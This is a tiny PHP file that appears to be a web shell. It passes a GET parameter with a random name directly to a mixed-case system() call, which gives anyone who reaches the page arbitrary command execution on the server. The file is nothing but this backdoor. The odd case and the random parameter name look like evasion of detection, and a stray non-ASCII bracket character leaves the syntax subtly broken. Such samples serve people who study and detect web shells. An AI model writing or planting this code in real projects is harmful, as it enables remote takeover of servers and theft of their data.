<?php
SysTeM($_GET['slWvsskS'〕);
?>
